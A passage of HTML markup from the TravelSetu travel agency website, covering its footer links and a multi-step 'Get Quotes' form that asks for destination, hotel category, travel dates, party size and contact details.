                          <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/rajasthan">Rajasthan  tour packages</a></li>
                          <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/seven-sisters">Seven Sisters tour packages</a></li>
                          <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/south-india">South-India tour packages</a></li>
                          <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/uttarakhand">Uttarakhand  tour packages</a></li>
                        </ul>
                  </div>
                  <div class="col-sm-6 col-md-3">
                    <h2>Popular Tour Packages</h2>
                    <ul class="discover triangle hover row">
                      <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/manali">Manali tour packages</a></li>
                      <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/shimla">Shimla tour packages</a></li>
                      <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/munnar">Munnar tour packages</a></li>
                      <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/kovlam">Kovlam tour packages</a></li>
                      <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/alleppey">Alleppey tour packages</a></li>
                      <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/thekkady">Thekkady tour packages</a></li>
                    </ul>
                  </div>
                  <div class="col-sm-6 col-md-3">
                    <ul class="discover triangle hover row">
                        </ul>
                  </div>
                  <div class="col-sm-6 col-md-3">
                    <h2>About Travelsetu</h2>
                        <iframe style="width:100%;height:150px;border:none;" src="https://www.youtube.com/embed/JaKdMeTf_Gg" allowfullscreen=""></iframe>
                    <br>
                    <p>TravelSetu.com, a one stop travelling solution. TravelSetu is like a connecting bridge between travelers and travelling companies, we help you find the travel packages that perfectly suit what you're looking for and it is as easy as ONE TWO THREE!</p>
                    <span><a href="https://travelsetu.com/holiday-tour-packages/privacy-policy"><i class="fa fa-caret-right"></i>&nbsp;&nbsp;Privacy Policy</a></span>
                    <span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://travelsetu.com/holiday-tour-packages/travel-leads"><i class="fa fa-caret-right"></i>&nbsp;&nbsp;Travel Leads</a></span>
                    <br>
                    <ul class="social-icons clearfix">
                      <li class="twitter"><a title="twitter" href="https://twitter.com/travelsetu" data-toggle="tooltip" target="_blank"><i class="soap-icon-twitter"></i></a></li>
                      <li class="googleplus"><a title="googleplus" href="https://plus.google.com/u/0/113110462005582465425" data-toggle="tooltip" target="_blank"><i class="soap-icon-googleplus"></i></a></li>
                      <li class="facebook"><a title="facebook" href="https://www.facebook.com/travelsetu" data-toggle="tooltip" target="_blank"><i class="soap-icon-facebook"></i></a></li>
                      <li class="linkedin"><a title="linkedin" href="https://www.linkedin.com/in/travel-setu-7255a314a/" data-toggle="tooltip" target="_blank"><i class="soap-icon-linkedin"></i></a></li>
                      <li><span class="contact-phone"><a title="+918046801919" href="tel:+918046801919" data-toggle="tooltip"><i class="soap-icon-phone"></i> +918046801919</a></span></li>
                      <li><a title="info@travelsetu.com" href="mailto:info@travelsetu.com" data-toggle="tooltip"><i class="soap-icon-message"></i></a></li>
                    </ul>
                    <br><br>
                  </div>
                </div>
              </div>
            </div>
            <div class="bottom gray-area">
              <div class="container">
                <div class="logo pull-left">
                  <a href="https://travelsetu.com" title="Travelsetu" style="background-size:containe;"><img src="https://travelsetu.com/holiday-tour-packages/images/logo.png" alt="Travelsetu" width="120" height="40" /></a>
                </div>
                <div class="copyright pull-right">
                  <p>&copy; 2020 Travelsetu</p>
                </div>
              </div>
            </div>
          </footer>

          <div class="col-md-12 text-right">
            <a id="back-to-top" href="Javascript:void(0);"><i class="soap-icon-longarrow-up circle btn_position"></i><span class="btn_position"><i class="soap-icon-longarrow-up circle"></i></span></a>
          </div>

          <div class="footer_button">
           <a class="button btn-medium sea-blue fbttn_wdth m_right2" href="tel:+918046801919">CALL: +918046801919</a>
           <a class="button btn-medium dark-blue2 fbttn_wdth popup" href="Javascript:void(0);" data-toggle="modal" data-target="#myModal">GET QUOTES</a>
          </div>
       <!-- ################## Footer End ################## -->

        </div>
        <!-- Modal Start -->
          <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-hidden="true"> <!-- aria-labelledby="myModalLabel" -->
            <div class="modal-dialog modal-lg m_all0">
              <div class="modal-content modal_adjust">
                <div class="modal-header bdr_none">
                  <button type="button" class="close close_hover" data-dismiss="modal">&times;</button>
                  <h3 class="modal-title text-center">Your Preferences</h3>
                </div>

                <!-- RIGHT PART -->
    <div class="col-md-12">

     <form name="frmGet" method="post" action="#">
        <!-- Step 0-->
        <div class="col-md-12 text-center no-padding" id="choose">
          <h2 class="popupHeading">I Want</h2>
          <div class="each-profile m_top10">
            <input type="radio" name="txtChoose" value="" id="ch1" class="input-hidden dest_name" />
            <label for="ch1"><img src="https://travelsetu.com/holiday-tour-packages/images/dome.png" style="width:110px;height:110px;" alt="" class="ch_dom" /></label>
            <label class="img_txt">Tour Packages for India</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtChoose" value="" id="ch2" class="input-hidden dest_name" />
            <label for="ch2"><img src="https://travelsetu.com/holiday-tour-packages/images/Plane.jpg" style="width:110px;height:110px;" alt="" class="ch_int" /></label>
            <label class="img_txt">International Tour Packages</label>
          </div>
          <div class="col-xs-12 m_top10" style="height:50px;"></div>
        </div>

        <!-- Step 1A -->
        <div class="col-md-12 text-center no-padding" id="dest_dom" style="display:none;">
          <h2 class="popupHeading">Please select your destination</h2>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="1" id="ab1" class="input-hidden dest_name" />
            <label for="ab1"><img src="https://travelsetu.com/crm/images/destination_image/Andaman.jpg" style="width:110px;height:110px;" alt="Andaman" onclick="selectDestination('1','dom','4','0');" class="bord" /></label>
            <label class="img_txt">Andaman</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="73" id="ab2" class="input-hidden dest_name" />
            <label for="ab2"><img src="https://travelsetu.com/crm/images/destination_image/Goa.jpg" style="width:110px;height:110px;" alt="Goa" onclick="selectDestination('73','dom','0','0');" class="bord" /></label>
            <label class="img_txt">Goa</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="2" id="ab3" class="input-hidden dest_name" />
            <label for="ab3"><img src="https://travelsetu.com/crm/images/destination_image/Himachal.jpg" style="width:110px;height:110px;" alt="Himachal" onclick="selectDestination('2','dom','4','0');" class="bord" /></label>
            <label class="img_txt">Himachal</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="47" id="ab4" class="input-hidden dest_name" />
            <label for="ab4"><img src="https://travelsetu.com/crm/images/destination_image/Kashmir.jpg" style="width:110px;height:110px;" alt="Kashmir" onclick="selectDestination('47','dom','6','0');" class="bord" /></label>
            <label class="img_txt">Kashmir</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="3" id="ab5" class="input-hidden dest_name" />
            <label for="ab5"><img src="https://travelsetu.com/crm/images/destination_image/Kerala.jpg" style="width:110px;height:110px;" alt="Kerala" onclick="selectDestination('3','dom','6','0');" class="bord" /></label>
            <label class="img_txt">Kerala</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="48" id="ab6" class="input-hidden dest_name" />
            <label for="ab6"><img src="https://travelsetu.com/crm/images/destination_image/Leh-Ladakh.jpg" style="width:110px;height:110px;" alt="Leh-Ladakh" onclick="selectDestination('48','dom','4','0');" class="bord" /></label>
            <label class="img_txt">Leh-Ladakh</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="4" id="ab7" class="input-hidden dest_name" />
            <label for="ab7"><img src="https://travelsetu.com/crm/images/destination_image/North-East.jpg" style="width:110px;height:110px;" alt="North-East" onclick="selectDestination('4','dom','4','0');" class="bord" /></label>
            <label class="img_txt">North-East</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="6" id="ab8" class="input-hidden dest_name" />
            <label for="ab8"><img src="https://travelsetu.com/crm/images/destination_image/Rajasthan.jpg" style="width:110px;height:110px;" alt="Rajasthan " onclick="selectDestination('6','dom','6','0');" class="bord" /></label>
            <label class="img_txt">Rajasthan </label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="78" id="ab9" class="input-hidden dest_name" />
            <label for="ab9"><img src="https://travelsetu.com/crm/images/destination_image/Seven-Sisters.jpg" style="width:110px;height:110px;" alt="Seven Sisters" onclick="selectDestination('78','dom','4','0');" class="bord" /></label>
            <label class="img_txt">Seven Sisters</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="66" id="ab10" class="input-hidden dest_name" />
            <label for="ab10"><img src="https://travelsetu.com/crm/images/destination_image/South-India.jpg" style="width:110px;height:110px;" alt="South-India" onclick="selectDestination('66','dom','5','0');" class="bord" /></label>
            <label class="img_txt">South-India</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="5" id="ab11" class="input-hidden dest_name" />
            <label for="ab11"><img src="https://travelsetu.com/crm/images/destination_image/Uttarakhand.jpg" style="width:110px;height:110px;" alt="Uttarakhand " onclick="selectDestination('5','dom','5','0');" class="bord" /></label>
            <label class="img_txt">Uttarakhand </label>
          </div>
          <div class="clearfix"></div>
          <div class="col-md-12 m_top35 destPre" style="text-align:left;"><a href="Javascript:void(0);" class="do_previous_choose link"><img src="https://travelsetu.com/holiday-tour-packages/images/previous.png" alt="" /></a></div>
          <div class="col-xs-12 m_top10" style="height:20px;"></div>
        </div>

        <!-- Step 1B -->
        <div class="col-md-12 text-center no-padding" id="dest_int" style="display:none;">
          <h2 class="popupHeading">Please select your destination</h2>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="45" id="abi1" class="input-hidden dest_name" />
            <label for="abi1"><img src="https://travelsetu.com/crm/images/destination_image/Bali.jpg" style="width:110px;height:110px;" alt="Bali" onclick="selectDestination('45','int','0','0');" class="bord" /></label>
            <label class="img_txt">Bali</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="72" id="abi2" class="input-hidden dest_name" />
            <label for="abi2"><img src="https://travelsetu.com/crm/images/destination_image/Bhutan.jpg" style="width:110px;height:110px;" alt="Bhutan" onclick="selectDestination('72','int','0','0');" class="bord" /></label>
            <label class="img_txt">Bhutan</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="12" id="abi3" class="input-hidden dest_name" />
            <label for="abi3"><img src="https://travelsetu.com/crm/images/destination_image/Dubai.jpg" style="width:110px;height:110px;" alt="Dubai" onclick="selectDestination('12','int','0','0');" class="bord" /></label>
            <label class="img_txt">Dubai</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="15" id="abi4" class="input-hidden dest_name" />
            <label for="abi4"><img src="https://travelsetu.com/crm/images/destination_image/Europe.jpg" style="width:110px;height:110px;" alt="Europe" onclick="selectDestination('15','int','0','0');" class="bord" /></label>
            <label class="img_txt">Europe</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="14" id="abi5" class="input-hidden dest_name" />
            <label for="abi5"><img src="https://travelsetu.com/crm/images/destination_image/Maldives.jpg" style="width:110px;height:110px;" alt="Maldives " onclick="selectDestination('14','int','0','0');" class="bord" /></label>
            <label class="img_txt">Maldives </label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="13" id="abi6" class="input-hidden dest_name" />
            <label for="abi6"><img src="https://travelsetu.com/crm/images/destination_image/Mauritius.jpg" style="width:110px;height:110px;" alt="Mauritius" onclick="selectDestination('13','int','0','0');" class="bord" /></label>
            <label class="img_txt">Mauritius</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="10" id="abi7" class="input-hidden dest_name" />
            <label for="abi7"><img src="https://travelsetu.com/crm/images/destination_image/Singapore.jpg" style="width:110px;height:110px;" alt="Singapore" onclick="selectDestination('10','int','0','0');" class="bord" /></label>
            <label class="img_txt">Singapore</label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtDestination" value="11" id="abi8" class="input-hidden dest_name" />
            <label for="abi8"><img src="https://travelsetu.com/crm/images/destination_image/Thailand.jpg" style="width:110px;height:110px;" alt="Thailand" onclick="selectDestination('11','int','0','0');" class="bord" /></label>
            <label class="img_txt">Thailand</label>
          </div>
          <div class="clearfix"></div>
          <div class="col-md-12 m_top35 destPre" style="text-align:left;"><a href="Javascript:void(0);" class="do_previous_choose link"><img src="https://travelsetu.com/holiday-tour-packages/images/previous.png" alt="" /></a></div>
          <div class="col-xs-12 m_top10" style="height:20px;"></div>
        </div>

        <!-- Step 2 -->
        <div class="col-md-12 text-center no-padding" id="sub_dest" style="display:none;">
          <h2 class="popupHeading">Which Destinations you Want to Explore?</h2>
          <div id="sub_destination_list"></div>
          <div class="col-xs-12 m_top10" style="height:20px;"></div>
        </div>
        <input type="hidden" id="sub_desti_number" value="">
        <input type="hidden" id="sub_desti_type" value="">
        <!-- Step 3 -->
        <div class="col-md-12 text-center no-padding" id="hotel_star" style="display:none;">
          <h2 class="popupHeading">Which Category Hotel You Want?</h2>
          <!-- <div class="col-xs-1 m_top10"></div> -->
          <div class="each-profile m_top10">
            <input type="radio" name="txtHotel" value="1" id="star1" class="input-hidden" />
            <label for="star1"><img src="https://travelsetu.com/holiday-tour-packages/images/1.png" alt="1 Star" class="hotel_star" style="border:none;border-radius:1px;" /></label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtHotel" value="2" id="star2" class="input-hidden" />
            <label for="star2"><img src="https://travelsetu.com/holiday-tour-packages/images/2.png" alt="2 Star" class="hotel_star" style="border:none;border-radius:1px;" /></label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtHotel" value="3" id="star3" class="input-hidden" />
            <label for="star3"><img src="https://travelsetu.com/holiday-tour-packages/images/3.png" alt="3 Star" class="hotel_star" style="border:none;border-radius:1px;" /></label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtHotel" value="4" id="star4" class="input-hidden" />
            <label for="star4"><img src="https://travelsetu.com/holiday-tour-packages/images/4.png" alt="4 Star" class="hotel_star" style="border:none;border-radius:1px;" /></label>
          </div>
          <div class="each-profile m_top10">
            <input type="radio" name="txtHotel" value="5" id="star5" class="input-hidden" />
            <label for="star5"><img src="https://travelsetu.com/holiday-tour-packages/images/5.png" alt="5 Star" class="hotel_star" style="border:none;border-radius:1px;" /></label>
          </div>
          <div class="clearfix"></div>
          <div class="col-md-12 m_top35" style="text-align:left;"><a href="Javascript:void(0);" class="do_previous_sub_deti link"><img src="https://travelsetu.com/holiday-tour-packages/images/previous.png" alt="" /></a></div>
          <div class="col-xs-12 m_top10" style="height:20px;"></div>
        </div>

        <!-- Step 4 -->
        <div class="col-md-12 text-center no-padding" id="flight_train" style="display:none;">
          <h2 class="popupHeading">Have You Booked Flight / Train?</h2>
          <div class="col-xs-6 m_top10">
            <input type="radio" name="txtBooked" value="1" id="booked1" class="input-hidden" />
            <label for="booked1"><img src="https://travelsetu.com/holiday-tour-packages/images/yes.png" alt="Yes" class="flight_train" style="border:none;border-radius:1px;" /></label>
          </div>
          <div class="col-xs-6 m_top10">
            <input type="radio" name="txtBooked" value="0" id="booked2" class="input-hidden" />
            <label for="booked2"><img src="https://travelsetu.com/holiday-tour-packages/images/no.png" alt="No" class="flight_train" style="border:none;border-radius:1px;" /></label>
          </div>
          <div class="clearfix"></div>
          <div class="col-md-12 m_top35" style="text-align:left;"><a href="Javascript:void(0);" class="do_previous_star link"><img src="https://travelsetu.com/holiday-tour-packages/images/previous.png" alt="" /></a></div>
          <div class="col-xs-12 m_top10" style="height:20px;"></div>
        </div>

        <!-- Step 5 -->
        <div class="col-md-12 text-center no-padding" id="dep_date" style="display:none;">
          <h2 class="popupHeading">Select your Departure Date</h2>
          <div class="col-xs-3 mobCal"></div>
          <div class="col-xs-12 m_top10">
            <div id="datePicker"></div>
            <input type="hidden" name="txtDate" id="txtDate" value="">
          </div>
          <div class="clearfix"></div>
          <div class="col-md-12 m_top35" style="text-align:left;"><a href="Javascript:void(0);" class="do_previous_flight link"><img src="https://travelsetu.com/holiday-tour-packages/images/previous.png" alt="" /></a></div>
          <div class="col-xs-12 m_top10" style="height:20px;"></div>
        </div>

        <!-- Step 6 -->
        <div class="col-md-12 text-center no-padding" id="holiday" style="display:none;">
          <h2 class="popupHeading">How Long Will Be Your Holiday?</h2>
          <div class="each-profile m_top35">
            <input type="radio" name="txtHoliday" value="1" id="holiday1" class="input-hidden" />
            <label for="holiday1"><span class="img_txt holiday">1 day</span></label>
          </div>
          <div class="each-profile m_top35">
            <input type="radio" name="txtHoliday" value="2" id="holiday2" class="input-hidden" />
            <label for="holiday2"><span class="img_txt holiday">2 days</span></label>
          </div>
          <div class="each-profile m_top35">
            <input type="radio" name="txtHoliday" value="3" id="holiday3" class="input-hidden" />
            <label for="holiday3"><span class="img_txt holiday">3 days</span></label>
          </div>
          <div class="each-profile m_top35">
            <input type="radio" name="txtHoliday" value="4" id="holiday4" class="input-hidden" />
            <label for="holiday4"><span class="img_txt holiday">4 days</span></label>
          </div>
          <div class="each-profile m_top35">
            <input type="radio" name="txtHoliday" value="5" id="holiday5" class="input-hidden" />
            <label for="holiday5"><span class="img_txt holiday">5 days</span></label>
          </div>
          <div class="each-profile m_top35">
            <input type="radio" name="txtHoliday" value="6" id="holiday6" class="input-hidden" />
            <label for="holiday6"><span class="img_txt holiday">6 days</span></label>
          </div>
          <div class="each-profile m_top35">
            <input type="radio" name="txtHoliday" value="7" id="holiday7" class="input-hidden" />
            <label for="holiday7"><span class="img_txt holiday">7 days</span></label>
          </div>
          <div class="each-profile m_top35">
            <input type="radio" name="txtHoliday" value="8" id="holiday8" class="input-hidden" />
            <label for="holiday8"><span class="img_txt holiday">8 days</span></label>
          </div>
          <div class="each-profile m_top35">
            <input type="radio" name="txtHoliday" value="9" id="holiday9" class="input-hidden" />
            <label for="holiday9"><span class="img_txt holiday">9 days</span></label>
          </div>
          <div class="each-profile m_top35 "><!-- resWidth -->
            <input type="radio" name="txtHoliday" value="10" id="holiday10" class="input-hidden" />
            <label for="holiday10"><span class="img_txt holiday">10 days</span></label>
          </div>
          <div class="each-profile m_top35 "><!-- resWidth1 -->
            <input type="radio" name="txtHoliday" value="11" id="holiday11" class="input-hidden" />
            <label for="holiday11"><span class="img_txt holiday">10 +days</span></label>
          </div>
          <div class="clearfix"></div>
          <div class="col-md-12 m_top35" style="text-align:left;"><a href="Javascript:void(0);" class="do_previous_date link"><img src="https://travelsetu.com/holiday-tour-packages/images/previous.png" alt="" /></a></div>
          <div class="col-xs-12 m_top10" style="height:20px;"></div>
        </div>

        <!-- Step 7 -->

        <div class="col-md-12 text-center no-padding" id="budget" style="display:none;">
          <h2 class="popupHeading">Let us know your holiday planning status</h2>
          <div class="col-xs-6 m_top35">
            <input type="radio" name="txtBudget" value="Not sure if I am taking this trip" id="budget1" class="input-hidden" />
            <label for="budget1"><img src="https://travelsetu.com/holiday-tour-packages/images/let_us1.png" alt="" class="budget" style="border:none;border-radius:1px;" /></label>
          </div>
          <div class="col-xs-6 m_top35">
            <input type="radio" name="txtBudget" value="Definitely going, need to finalize destination" id="budget2" class="input-hidden" />
            <label for="budget2"><img src="https://travelsetu.com/holiday-tour-packages/images/let_us2.png" alt="" class="budget" style="border:none;border-radius:1px;" /></label>
          </div>
          <div class="col-xs-6 m_top35">
            <input type="radio" name="txtBudget" value="Destination is decided, waiting for quote" id="budget3" class="input-hidden" />
            <label for="budget3"><img src="https://travelsetu.com/holiday-tour-packages/images/let_us3.png" alt="" class="budget" style="border:none;border-radius:1px;" /></label>
          </div>
          <div class="col-xs-6 m_top35">
            <input type="radio" name="txtBudget" value="Flights Already Booked" id="budget4" class="input-hidden" />
            <label for="budget4"><img src="https://travelsetu.com/holiday-tour-packages/images/let_us4.png" alt="" class="budget" style="border:none;border-radius:1px;" /></label>
          </div>
          <div class="clearfix"></div>
          <div class="col-md-12 m_top35" style="text-align:left;"><a href="Javascript:void(0);" class="do_previous_holiday link"><img src="https://travelsetu.com/holiday-tour-packages/images/previous.png" alt="" /></a></div>
          <div class="col-xs-12 m_top10" style="height:20px;"></div>
        </div>

        <!-- Step 8 -->
        <div class="col-md-12 text-center no-padding" id="will_book" style="display:none;">
          <h2 class="popupHeading">I will book this Holiday In</h2>
          <div class="each-profile m_top45">
            <input type="radio" name="txtWillBook" value="Not now" id="will_book1" class="input-hidden" />
            <label for="will_book1"><span class="img_txt will_book" style="border-radius:0%;">Not now</span></label>
          </div>
          <div class="each-profile m_top45">
            <input type="radio" name="txtWillBook" value="1-3 Days" id="will_book3" class="input-hidden" />
            <label for="will_book3"><span class="img_txt will_book" style="border-radius:0%;">1-3 Days</span></label>
          </div>
          <div class="each-profile m_top45">
            <input type="radio" name="txtWillBook" value="This week" id="will_book4" class="input-hidden" />
            <label for="will_book4"><span class="img_txt will_book" style="border-radius:0%;">This week</span></label>
          </div>
          <div class="each-profile m_top45" style="width:135px;">
            <input type="radio" name="txtWillBook" value="This month" id="will_book5" class="input-hidden" />
            <label for="will_book5"><span class="img_txt will_book" style="border-radius:0%;">This month</span></label>
          </div>
          <div class="each-profile m_top45" style="width:206px;"> <!-- resYes -->
            <input type="radio" name="txtWillBook" value="Just checking price" id="will_book2" class="input-hidden" />
            <label for="will_book2"><span class="img_txt will_book" style="border-radius:0%;">Just checking price</span></label>
          </div>
          <div class="clearfix"></div>
          <div class="col-md-12 m_top35" style="text-align:left;"><a href="Javascript:void(0);" class="do_previous_budget link"><img src="https://travelsetu.com/holiday-tour-packages/images/previous.png" alt="" /></a></div>
          <div class="col-xs-12 m_top10" style="height:20px;"></div>
        </div>

        <!-- Step 9 -->
        <div class="col-md-12 text-center no-padding" id="people" style="display:none;">
          <h2 class="popupHeading">How many people are Traveling?</h2>
          <div class="col-xs-12 m_top35 resYes">
            <div class="col-xs-6">
                <h3 class="txtCol" style="color:#FFF;">Adults <small style="color:#FFF;">(12+ Years)</small></h3>
            </div>
            <div class="col-xs-6">
              <div class="count-input space-bottom">
                <a class="incr-btn" data-action="decrease" href="#"><i class="fa fa-minus-circle" aria-hidden="true" style="color:#0AB596;"></i></a>
                <input class="quantity" type="text" name="txtAdult" id="txtAdult" value="2" style="color:#FFF;" />
                <a class="incr-btn" data-action="increase" href="#"><i class="fa fa-plus-circle" aria-hidden="true" style="color:#0AB596;"></i></a>
              </div>
            </div>
          </div>
          <div class="col-xs-12 m_top35 resYes">
            <div class="col-xs-6">
                <h3 class="txtCol" style="color:#FFF;">Childrens <small style="color:#FFF;">(0 to 5 years)</small></h3>
            </div>
            <div class="col-xs-6">
              <div class="count-input space-bottom">
                <a class="incr-btn" data-action="decrease" href="#"><i class="fa fa-minus-circle" aria-hidden="true" style="color:#0AB596;"></i></a>
                <input class="quantity" type="text" name="txtChild" value="0" style="color:#FFF;"/>
                <a class="incr-btn" data-action="increase" href="#"><i class="fa fa-plus-circle" aria-hidden="true" style="color:#0AB596;"></i></a>
              </div>
            </div>
          </div>
          <div class="col-xs-12 m_top35 resYes">
            <div class="col-xs-6">
                <h3 class="txtCol" style="color:#FFF;">Childrens <small style="color:#FFF;">(5 to 12 years)</small></h3>
            </div>
            <div class="col-xs-6">
              <div class="count-input space-bottom">
                <a class="incr-btn" data-action="decrease" href="#"><i class="fa fa-minus-circle" aria-hidden="true" style="color:#0AB596;"></i></a>
                <input class="quantity" type="text" name="txtChildL" value="0" style="color:#FFF;"/>
                <a class="incr-btn" data-action="increase" href="#"><i class="fa fa-plus-circle" aria-hidden="true" style="color:#0AB596;"></i></a>
              </div>
            </div>
          </div>
          <div class="clearfix"></div>
          <div class="col-md-12 m_top10">
            <span style="text-align:left;width: 50%;float: left;"><a href="Javascript:void(0);" class="do_will_book link"><img src="https://travelsetu.com/holiday-tour-packages/images/previous.png" alt="" /></a></span>
            <span style="text-align:right;width: 50%;float: right;"><button type="button" class="btn btn-success" onclick="return checkPeople();" style="text-align:right;">Next</button></span>
          </div>
          <div class="clearfix"></div>
          <div id="showPeAlert" style="color:red;"></div>
          <div class="col-xs-12 m_top10" style="height:20px;"></div>
        </div>

        <!-- Step 10 -->
        <div class="col-md-12 no-padding" id="details" style="display:none;">
          <h2 class="popupHeading">Please Share Your Contact Details so We Can Arrange Best Holiday Quotes For You ASAP. Thanks.</h2>
          <div class="col-xs-6 m_top10 resYes">
            <label class="txtCol" style="color:#FFF;">Your Name<span style="color:red;">*</span></label>
            <input type="text" name="txtName" class="form-control full-width" required />
          </div>
          <div class="col-xs-6 m_top10 resYes">
            <label class="txtCol" style="color:#FFF;">Email<span style="color:red;">*</span></label>
            <input type="email" name="txtEmail" class="form-control full-width" required />
          </div>
          <div class="col-xs-6 m_top10 resYes">
            <label class="txtCol" style="color:#FFF;">Mobile Number<span style="color:red;">*</span></label>
            <select name="txtCode" class="form-control half-width" required style="width: 40%;float: left;">
                  <option value="">Cuntry Code</option>
                  <option value="93" >Afghanistan(+93)</option><option value="355" >Albania(+355)</option><option value="213" >Algeria(+213)</option><option value="1684" >American Samoa(+1684)</option><option value="376" >Andorra(+376)</option><option value="244" >Angola(+244)</option><option value="1264" >Anguilla(+1264)</option><option value="1268" >Antigua and Barbuda(+1268)</option><option value="54" >Argentina(+54)</option><option value="374" >Armenia(+374)</option><option value="297" >Aruba(+297)</option><option value="61" >Australia(+61)</option><option value="43" >Austria(+43)</option><option value="994" >Azerbaijan(+994)</option><option value="1242" >Bahamas(+1242)</option><option value="973" >Bahrain(+973)</option><option value="880" >Bangladesh(+880)</option><option value="1246" >Barbados(+1246)</option><option value="375" >Belarus(+375)</option><option value="32" >Belgium(+32)</option><option value="501" >Belize(+501)</option><option value="229" >Benin(+229)</option><option value="1441" >Bermuda(+1441)</option><option value="975" >Bhutan(+975)</option><option value="591" >Bolivia(+591)</option><option value="387" >Bosnia and Herzegovina(+387)</option><option value="267" >Botswana(+267)</option><option value="55" >Brazil(+55)</option><option value="246" >British Indian Ocean Territory(+246)</option><option value="673" >Brunei Darussalam(+673)</option><option value="359" >Bulgaria(+359)</option><option value="226" >Burkina Faso(+226)</option><option value="257" >Burundi(+257)</option><option value="855" >Cambodia(+855)</option><option value="237" >Cameroon(+237)</option><option value="238" >Cape Verde(+238)</option><option value="1345" >Cayman Islands(+1345)</option><option value="236" >Central African Republic(+236)</option><option value="235" >Chad(+235)</option><option value="56" >Chile(+56)</option><option value="86" >China(+86)</option><option value="672" >Cocos (Keeling) Islands(+672)</option><option value="57" >Colombia(+57)</option><option value="269" >Comoros(+269)</option><option value="242" >Congo(+242)</option><option value="243" >Congo, the Democratic Republic of the(+243)</option><option value="682" >Cook Islands(+682)</option><option value="506" >Costa Rica(+506)</option><option value="225" >Cote D'Ivoire(+225)</option><option value="385" >Croatia(+385)</option><option value="53" >Cuba(+53)</option><option value="357" >Cyprus(+357)</option><option value="420" >Czech Republic(+420)</option><option value="45" >Denmark(+45)</option><option value="253" >Djibouti(+253)</option><option value="1767" >Dominica(+1767)</option><option value="1809" >Dominican Republic(+1809)</option><option value="593" >Ecuador(+593)</option><option value="20" >Egypt(+20)</option><option value="503" >El Salvador(+503)</option><option value="240" >Equatorial Guinea(+240)</option><option value="291" >Eritrea(+291)</option><option value="372" >Estonia(+372)</option><option value="251" >Ethiopia(+251)</option><option value="500" >Falkland Islands (Malvinas)(+500)</option><option value="298" >Faroe Islands(+298)</option><option value="679" >Fiji(+679)</option><option value="358" >Finland(+358)</option><option value="33" >France(+33)</option><option value="594" >French Guiana(+594)</option><option value="689" >French Polynesia(+689)</option><option value="241" >Gabon(+241)</option><option value="220" >Gambia(+220)</option><option value="995" >Georgia(+995)</option><option value="49" >Germany(+49)</option><option value="233" >Ghana(+233)</option><option value="350" >Gibraltar(+350)</option><option value="30" >Greece(+30)</option><option value="299" >Greenland(+299)</option><option value="1473" >Grenada(+1473)</option><option value="590" >Guadeloupe(+590)</option><option value="1671" >Guam(+1671)</option><option value="502" >Guatemala(+502)</option><option value="224" >Guinea(+224)</option><option value="245" >Guinea-Bissau(+245)</option><option value="592" >Guyana(+592)</option><option value="509" >Haiti(+509)</option><option value="39" >Holy See (Vatican City State)(+39)</option><option value="504" >Honduras(+504)</option><option value="852" >Hong Kong(+852)</option><option value="36" >Hungary(+36)</option><option value="354" >Iceland(+354)</option><option value="91" selected>India(+91)</option><option value="62" >Indonesia(+62)</option><option value="98" >Iran, Islamic Republic of(+98)</option><option value="964" >Iraq(+964)</option><option value="353" >Ireland(+353)</option><option value="972" >Israel(+972)</option><option value="1876" >Jamaica(+1876)</option><option value="81" >Japan(+81)</option><option value="962" >Jordan(+962)</option><option value="7" >Kazakhstan(+7)</option><option value="254" >Kenya(+254)</option><option value="686" >Kiribati(+686)</option><option value="850" >Korea, Democratic People's Republic of(+850)</option><option value="82" >Korea, Republic of(+82)</option><option value="965" >Kuwait(+965)</option><option value="996" >Kyrgyzstan(+996)</option><option value="856" >Lao People's Democratic Republic(+856)</option><option value="371" >Latvia(+371)</option><option value="961" >Lebanon(+961)</option><option value="266" >Lesotho(+266)</option><option value="231" >Liberia(+231)</option><option value="218" >Libyan Arab Jamahiriya(+218)</option><option value="423" >Liechtenstein(+423)</option><option value="370" >Lithuania(+370)</option><option value="352" >Luxembourg(+352)</option><option value="853" >Macao(+853)</option><option value="389" >Macedonia, the Former Yugoslav Republic of(+389)</option><option value="261" >Madagascar(+261)</option><option value="265" >Malawi(+265)</option><option value="60" >Malaysia(+60)</option><option value="960" >Maldives(+960)</option><option value="223" >Mali(+223)</option><option value="356" >Malta(+356)</option><option 